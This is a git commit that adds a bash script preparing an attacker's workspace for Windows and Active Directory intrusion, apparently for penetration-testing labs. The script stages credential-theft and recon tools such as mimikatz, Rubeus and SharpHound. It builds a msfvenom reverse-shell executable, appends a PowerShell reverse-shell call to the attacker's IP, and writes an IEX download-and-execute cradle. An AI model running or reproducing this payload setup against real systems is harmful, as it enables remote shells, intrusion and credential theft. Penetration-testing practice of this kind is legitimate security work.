f9c1e22b9373fa3422272e013b29428c1f4a30c1
Imran Thoufeeque (0xI7Z3R0) <75982271+I7Z3R0@users.noreply.github.com>
2025-03-26 05:44:28 +0530

    Create adready.sh

---
+++ Ready_machines/adready.sh
@@ -0,0 +1,36 @@
+#!/bin/bash
+
+echo "Enter the target IP Address : "
+read target_ip
+mkdir -p nmap www exploit research autorecon
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 www
+cp /opt/AD/PowerView.ps1 www
+cp /usr/share/seclists/Web-Shells/laudanum-1.0/php/php-windows-reverse.php www
+cp /opt/priv/winpeas/winPEASany.exe www
+cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 www
+cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 www
+cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1 www
+cp /opt/winready/agent.exe www
+cp /opt/winready/proxy www
+cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe www
+cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 www
+cp /opt/kerbrute/kerbrute_linux_amd64 research
+cp /usr/share/windows-resources/binaries/nc64.exe www
+cp /opt/winready/mimikatz.exe www
+cp /opt/AD/PowerSploit/Recon/PowerView.ps1 www
+cp /opt/winready/Rubeus.exe www
+
+
+if [ ! -e notes.md ]; then
+    touch notes.md
+    ip_tun0=$(sh -c 'ip a | awk "/tun0\$/{gsub(/\/.*/, \"\"); print \$2}"')
+    echo -e "MY IP = $ip_tun0" >> notes.md
+    echo -e "Target = $target_ip" >> notes.md
+    echo -e "$target_ip" > /target/target
+    reverse -p 9001 >> research/rev.out
+    msfvenom -p windows/shell_reverse_tcp LHOST=$ip_tun0 LPORT=9001 -f exe -o www/shell.exe > /dev/null 2>&1
+    echo "Invoke-PowerShellTcp -Reverse -IPAddress ${ip_tun0} -Port 9001" >> www/Invoke-PowerShellTcp.ps1
+    cp www/Invoke-PowerShellTcp.ps1 www/rev.ps1
+    echo "IEX(New-Object Net.Webclient).DownloadString(\"http://${ip_tun0}:8000/rev.ps1\")" >> www/cradle
+    subl $(pwd)
+fi
